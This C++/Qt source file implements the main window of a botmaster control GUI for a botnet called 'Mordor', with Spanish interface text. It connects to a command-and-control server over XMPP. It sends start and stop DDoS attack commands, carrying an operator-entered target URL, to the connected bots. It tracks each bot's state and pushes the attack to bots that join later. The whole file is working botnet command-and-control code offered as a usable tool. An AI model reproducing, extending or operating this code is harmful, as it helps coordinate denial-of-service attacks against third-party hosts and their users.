#include "mainwindow.h"
#include "global.h"
#include "centralwidget.h"
#include "connectdialog.h"
#include "xmppclient.h"
#include "getstatuscommand.h"
#include "getbotstatecommand.h"
#include "startattackcommand.h"
#include "stopattackcommand.h"
#include "botstateresponse.h"
#include "attackstartedresponse.h"
#include "attackstoppedresponse.h"
#include "bot.h"
#include "attack.h"
#include <QAction>
#include <QMenu>
#include <QMenuBar>
#include <QToolBar>
#include <QStatusBar>
#include <QLabel>
#include <QCloseEvent>
#include <QMessageBox>
#include <QInputDialog>

MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent)
{
    _xmppClient = new XmppClient(APPLICATION_NAME);
    _xmppClient -> setParent(this);

    createWidgets();
    createConnections();
    setWindowTitle(APPLICATION_NAME);
    setWindowIcon(QIcon(":images/sauron.png"));
    setConnected(false);
    setAttackInProgress(false);
}

void MainWindow::closeEvent(QCloseEvent *event)
{
    if(verifyExit()) {
        disconnectFromCC();
        event -> accept();
    } else
        event -> ignore();
}

void MainWindow::connectToCC()
{
    ConnectDialog dialog(this);

    if(dialog.exec() == QDialog::Accepted) {
        QString server = dialog.domain();
        QString username = dialog.username();
        QString password = dialog.password();

        _xmppClient -> connectToServer(QString("%1@%2").arg(username).arg(server), password);
    }
}

void MainWindow::disconnectFromCC()
{
    if(_xmppClient -> isConnected())
        _xmppClient -> disconnectFromServer();
}

void MainWindow::startAttack()
{
    bool ok;
    QString target = QInputDialog::getText(this, tr("Iniciar ataque DDoS"), tr("URL Objetivo:"), QLineEdit::Normal, "", &ok);

    if(ok && !target.isEmpty()) {
        setAttackInProgress(true, Attack(_attack.id() + 1, target));

        _centralWidget -> writeEvent(QString("Modo Ataque++"));

        _xmppClient -> sendCommand(StartAttackCommand(_attack.target(), _attack.id()));

        _centralWidget -> writeEvent(QString("Enviado START_ATTACK_CMD [1:N]"));
    }
}

void MainWindow::stopAttack()
{
    bool stop = QMessageBox::question(this, tr("Confirmar parada"),
                                            tr("¿Esta seguro de querer parar el ataque?"),
                                            QMessageBox::Yes | QMessageBox::Default |
                                            QMessageBox::No) == QMessageBox::Yes;

    if(stop) {
        _xmppClient -> sendCommand(StopAttackCommand(_attack.id()));

        _centralWidget -> writeEvent(QString("Enviado STOP_ATTACK_CMD [1:N]"));

        setAttackInProgress(false);

        _centralWidget -> writeEvent(QString("Modo Ataque--"));
    }
}

void MainWindow::about()
{
    QMessageBox::about(this, tr("About %1").arg(APPLICATION_NAME),
                             tr("<h2>%1 %2</h2>"
                                "<h3>GUI para botmaster de la botnet Mordor</h3>"
                                "<p>(C) %3 %4 <a href= \"mailto:%5\" >%5</a></p>"
                                "<p><a href= \"%6\" >%6</a></p>"
                                "<p>Licensed under <a href=\"http://www.gnu.org/licenses/gpl.html\" >GNU General Public License version 3</a></p>")
                             .arg(APPLICATION_NAME_LONG)
                             .arg(APPLICATION_VERSION)
                             .arg(APPLICATION_YEARS)
                             .arg(AUTHOR_NAME)
                             .arg(AUTHOR_EMAIL)
                             .arg(APPLICATION_WEB));
}

void MainWindow::readyOnXmppClient()
{
    setConnected(true);
    setAttackInProgress(false);

    _centralWidget -> writeEvent(QString("Conectado a C&C como %1").arg(_xmppClient -> whoAmI()));
}

void MainWindow::disconnectedOnXmppClient()
{
    setConnected(false);
    setAttackInProgress(false);

    _centralWidget -> writeEvent(QString("Desconectado de C&C"));
}

void MainWindow::responseReceivedOnXmppClient(Message *response)
{
    if(BotStateResponse *botStateResponse = dynamic_cast<BotStateResponse *>(response)) {
        Bot *bot = new Bot(*botStateResponse -> bot());

        _centralWidget -> insertBot(botStateResponse -> from(), bot);

        _centralWidget -> writeEvent(QString("Recibido BOT_STATE_RES [1:1] de %1").arg(botStateResponse -> from()));

        if(_attackInProgress && bot -> state() != AttackInProgress) {
            StartAttackCommand command(_attack.target(), _attack.id());

            command.setTo(botStateResponse -> from());

            _xmppClient -> sendCommand(command);

            _centralWidget -> writeEvent(QString("Enviado START_ATTACK_CMD [1:1] a %1").arg(botStateResponse -> from()));
        } else if(!_attackInProgress && bot -> state() == AttackInProgress) {
            setAttackInProgress(true, bot -> attack());

            _centralWidget -> writeEvent(QString("Modo Ataque++ (Ataque en progreso en %1)").arg(botStateResponse -> from()));

            _xmppClient -> sendCommand(StartAttackCommand(_attack.target(), _attack.id()));

            _centralWidget -> writeEvent(QString("Enviado START_ATTACK_CMD [1:N]"));
        }
    } else if(dynamic_cast<AttackStartedResponse *>(response)) {
        Bot *bot = _centralWidget -> bot(response -> from());

        bot -> setState(AttackInProgress);

        _centralWidget -> modifyBot(response -> from());

        _centralWidget -> writeEvent(QString("Recibido ATTACK_STARTED_RES [1:1] de %1").arg(response -> from()));
    } else if(dynamic_cast<AttackStoppedResponse *>(response)) {
        Bot *bot = _centralWidget -> bot(response -> from());

        bot -> setState(WaitingForCommand);

        _centralWidget -> modifyBot(response -> from());

        _centralWidget -> writeEvent(QString("Recibido ATTACK_STOPPED_RES [1:1] de %1").arg(response -> from()));
    }

    delete response;
}

void MainWindow::botAddedOnXmppClient(const QString &roomId)
{
    if(roomId != _xmppClient -> whoAmIOnRoom()) {
        GetBotStateCommand command;

        command.setTo(roomId);

        _xmppClient -> sendCommand(command);

        _centralWidget -> writeEvent(QString("Enviando GET_BOT_STATE_CMD [1:1] (Entrada %1)").arg(roomId));
    }
}

void MainWindow::botRemovedOnXmppClient(const QString &roomId)
{
    if(roomId != _xmppClient -> whoAmIOnRoom()) {
        _centralWidget -> removeBot(roomId);

        _centralWidget -> writeEvent(QString("Salida %1").arg(roomId));
    }
}

void MainWindow::createWidgets()
{
    createCentralWidget();
    createActions();
    createMenus();
    createToolBar();
    createStatusBar();
}

void MainWindow::createCentralWidget()
{
    _centralWidget = new CentralWidget;

    setCentralWidget(_centralWidget);
}

void MainWindow::createActions()
{
    _connectToCCAction = new QAction(tr("&Conectar a CC..."), this);
    //_connectToCCAction->setIcon(QIcon(""));
    _connectToCCAction -> setStatusTip(tr("Establecer conexion con el CC de la Botnet"));

    _disconnectFromCCAction = new QAction(tr("&Desconectar del CC"), this);
    //_disconnectFromCCAction->setIcon(QIcon(""));
    _disconnectFromCCAction -> setStatusTip(tr("Cerrar conexion con el CC"));

    _exitAction = new QAction(tr("&Salir"), this);
    //_exitAction->setIcon(QIcon(""));
    _exitAction -> setStatusTip(tr("Salir de la aplicacion"));

    _startAttackAction = new QAction(tr("&Iniciar..."), this);
    //_startAttackAction->setIcon(QIcon(""));
    _startAttackAction -> setStatusTip(tr("Iniciar ataque DDoS sobre un host objetivo"));

    _stopAttackAction = new QAction(tr("&Parar"), this);
    //_stopAttackAction->setIcon(QIcon(""));
    _stopAttackAction -> setStatusTip(tr("Parar ataque DDoS en marcha"));

    _aboutAction = new QAction(tr("Acerca de"), this);
    //_aboutAction->setIcon(QIcon(""));
    _aboutAction -> setStatusTip(tr("Muestra informacion acerca de la aplicacion"));
}

void MainWindow::createMenus()
{
    _applicationMenu = menuBar() -> addMenu(tr("Ap&licacion"));
    _applicationMenu -> addAction(_connectToCCAction);
    _applicationMenu -> addAction(_disconnectFromCCAction);
    _applicationMenu -> addAction(_exitAction);

    _attackMenu = menuBar() -> addMenu(tr("&Ataque"));
    _attackMenu -> addAction(_startAttackAction);
    _attackMenu -> addAction(_stopAttackAction);

    _helpMenu = menuBar() -> addMenu(tr("A&yuda"));
    _helpMenu -> addAction(_aboutAction);
}

void MainWindow::createToolBar()
{
    _applicationToolBar = addToolBar(tr("Aplicacion"));
    _applicationToolBar -> addAction(_connectToCCAction);
    _applicationToolBar -> addAction(_disconnectFromCCAction);

    _attackToolBar = addToolBar(tr("Ataque"));
    _attackToolBar -> addAction(_startAttackAction);
    _attackToolBar -> addAction(_stopAttackAction);
}

void MainWindow::createStatusBar()
{
    _ccLabel = new QLabel;

    _modeLabel = new QLabel(tr("Modo:       "));
    _modeLabel -> setMinimumSize(_modeLabel -> sizeHint());
    _modeLabel -> setAlignment(Qt::AlignRight);

    statusBar() -> addWidget(_ccLabel);
    statusBar() -> addWidget(_modeLabel, 1);
}

void MainWindow::createConnections()
{
    connect(_connectToCCAction, SIGNAL(triggered()),
            this, SLOT(connectToCC()));
    connect(_disconnectFromCCAction, SIGNAL(triggered()),
            this, SLOT(disconnectFromCC()));
    connect(_exitAction, SIGNAL(triggered()),
            this, SLOT(close()));
    connect(_startAttackAction, SIGNAL(triggered()),
            this, SLOT(startAttack()));
    connect(_stopAttackAction, SIGNAL(triggered()),
            this, SLOT(stopAttack()));
    connect(_aboutAction, SIGNAL(triggered()),
            this, SLOT(about()));
    connect(_xmppClient, SIGNAL(ready()),
            this, SLOT(readyOnXmppClient()));
    connect(_xmppClient, SIGNAL(disconnected()),
            this, SLOT(disconnectedOnXmppClient()));
    connect(_xmppClient, SIGNAL(responseReceived(Message *)),
            this, SLOT(responseReceivedOnXmppClient(Message *)));
    connect(_xmppClient, SIGNAL(botAdded(const QString&)),
            this, SLOT(botAddedOnXmppClient(const QString&)));
    connect(_xmppClient, SIGNAL(botRemoved(const QString&)),
            this, SLOT(botRemovedOnXmppClient(const QString&)));
}

void MainWindow::setConnected(bool connected)
{
    _connected = connected;

    _centralWidget -> setEnabled(_connected);
    _connectToCCAction -> setEnabled(!_connected);
    _disconnectFromCCAction -> setEnabled(_connected);
    _attackMenu -> setEnabled(_connected);
    _ccLabel -> setText(_connected ? tr("Conectado %1").arg(_xmppClient -> whoAmI()) : tr("Desconectado"));
}

void MainWindow::setAttackInProgress(bool attackInProgress, const Attack& attack)
{
    _attackInProgress = attackInProgress;

    if(_attackInProgress)
        _attack = attack;

    _startAttackAction -> setEnabled(_connected && !_attackInProgress);
    _stopAttackAction -> setEnabled(_connected && _attackInProgress);
    _modeLabel -> setText(tr("Modo: %1").arg(_connected ? (attackInProgress ? tr("ataque") : tr("espera")) : "      "));
}

bool MainWindow::verifyExit()
{
    return QMessageBox::question(this, tr("Confirmar salida"),
                                 tr("¿Esta seguro de querer abandonar la aplicacion?"),
                                 QMessageBox::Yes | QMessageBox::Default |
                                 QMessageBox::No) == QMessageBox::Yes;
}
